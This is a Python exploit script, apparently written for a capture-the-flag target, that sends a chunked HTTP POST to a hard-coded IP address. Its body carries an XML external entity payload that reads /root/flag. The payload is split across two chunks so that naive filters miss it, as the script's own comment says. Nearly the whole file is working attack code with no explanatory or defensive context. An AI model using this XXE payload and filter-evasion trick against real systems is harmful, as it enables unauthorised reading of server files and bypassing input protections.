#!/usr/bin/env python3
import socket, ssl, sys

HOST = "54.72.82.22"
PORT = 8031
TIMEOUT = 8

#split the SYSTEM path across two chunks to try to evade naive filters
part1 = '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///ro'
part2 = 'ot/flag"> ]><request><id>&xxe;</id></request>'

# Build chunked body:
# each chunk: <len_in_hex>\r\n<chunk-data>\r\n
def chunk(s):
    return f"{len(s):x}\r\n{s}\r\n"

body = chunk(part1) + chunk(part2) + "0\r\n\r\n"

request_lines = [
    "POST /fetch_user HTTP/1.1",
    f"Host: {HOST}:{PORT}",
    "User-Agent: chunked-client/1.0",
    "Accept: */*",
    "Content-Type: application/xml",
    "Transfer-Encoding: chunked",
    "Connection: close",
    "",  # blank line before body
]

request = "\r\n".join(request_lines).encode() + body.encode()

# send and receive
try:
    s = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    s.sendall(request)
    s.settimeout(TIMEOUT)
    resp = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    print(resp.decode(errors="replace"))
except socket.timeout:
    print("timeout")
except Exception as e:
    print("error:", e)
    sys.exit(1)
